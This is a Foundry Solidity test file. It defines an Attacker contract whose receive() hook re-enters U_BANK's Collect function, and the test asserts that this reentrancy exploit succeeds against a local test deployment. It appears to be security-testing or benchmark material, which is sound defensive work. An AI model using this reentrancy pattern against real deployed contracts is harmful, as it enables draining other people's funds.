
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    
    U_BANK public _contractUnderTest;
    Attacker public _attacker;
    Log public _log;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 2 ether && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // The Collect function requires block.timestamp > acc.unlockTime.
        // Put sets unlockTime to at least block.timestamp.
        // We must warp forward to satisfy the condition.
        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds to pass the balance checks in Collect
        // Pass 0 as unlockTime so it defaults to current block.timestamp
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedAttackVal = val;

        // Call the vulnerable function
        _victim.Collect(val);

        // If we successfully re-entered, the count will be incremented in receive()
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            _victim.Collect(storedAttackVal);
        }
    }
}
